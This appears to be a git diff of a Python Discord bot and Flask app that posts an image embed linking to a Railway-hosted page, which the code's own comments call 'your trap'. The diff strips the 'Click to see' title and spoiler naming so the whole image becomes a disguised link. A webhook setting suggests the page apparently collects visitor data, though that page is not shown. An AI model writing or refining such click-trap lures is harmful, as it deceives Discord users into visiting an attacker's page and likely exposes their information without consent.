@@ -21,7 +21,6 @@ WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 RAILWAY_URL = "https://rnbw-production.up.railway.app"
 # ---------------------
 
-# The page they hit when they click the spoiler image
 @app.route('/')
 def index():
     return render_template_string("""
@@ -95,21 +94,22 @@ async def on_ready():
 
 @bot.command()
 async def send(ctx):
-    try:
-        # Loads the image you just uploaded
-        file = discord.File("image.png", filename="SPOILER_image.png")
-    except Exception as e:
-        await ctx.send(f"Error: Could not find image.png. {e}")
-        return
-
-    # This creates the clickable link wrapper around the image
+    # We create an embed. 
+    # The thumbnail is your uploaded image.
+    # The URL of the embed is your trap.
     embed = discord.Embed(
-        title="Click to see",
+        title="",
         url=RAILWAY_URL,
         color=0x2b2d31
     )
-    embed.set_image(url="attachment://SPOILER_image.png")
+    # This attaches the image to the embed
+    # IMPORTANT: You must upload your image to GitHub and name it 'image.png'
+    # But instead of uploading it as a file, we send it as an attachment URL.
+    
+    file = discord.File("image.png", filename="image.png")
+    embed.set_image(url="attachment://image.png")
 
+    # We send the embed. The entire image becomes clickable because of the embed.url
     await ctx.send(embed=embed, file=file)
 
 def run_bot():
